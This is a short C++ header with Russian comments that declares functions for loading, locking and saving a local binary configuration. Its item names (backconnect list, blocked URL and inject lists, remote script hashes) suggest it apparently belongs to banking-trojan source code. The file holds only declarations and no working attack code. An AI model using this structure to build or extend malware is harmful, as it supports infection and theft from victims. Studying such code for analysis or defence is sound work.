/*
  Работа с локальной конфигурацией.
*/
#pragma once

#include "..\common\binstorage.h"

namespace LocalConfig
{
  //Список элементов локальной конфигурации.
  enum
  {
    ITEM_REMOTESCRIPT_HASH      = 1, //Массив бинарных MD5.
    ITEM_BACKCONNECT_LIST       = 2, //Мультистрока ANSI.
    ITEM_URLLIST_BLOCKED        = 3, //Мультистрока ANSI.
    ITEM_URLLIST_BLOCKEDINJECTS = 4  //Мультистрока ANSI.
  };
  
  /*
    Инициализация.
  */
  void init(void);
  
  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Загрузка текущей конфигурации в память процесса.

    Return - указатель на конфиг(необходимо освободить через Mem), или NULL в случаи ошибки.
  */
  BinStorage::STORAGE *getCurrent(void);

  /*
    Получение текущей конфигурации с блокировкой доступа для других потоков и процессов.

    Return - указатель на конфиг(необходимо освободить через Mem), или NULL в случаи ошибки.
  */
  BinStorage::STORAGE *beginReadWrite(void);

  /*
    Снятие блокировки созданной beginReadWrite() и сохранение изменений.

    IN OUT binStorage - конфиг для сохранения, или NULL если сохранение не требуется. На выходе
                        содержимое буфера не пригодна для использования.
    
    Return            - true - конфиг успешно сохранен,
                        false - конфиг не сохранен.
  */
  bool endReadWrite(BinStorage::STORAGE *binStorage);
};
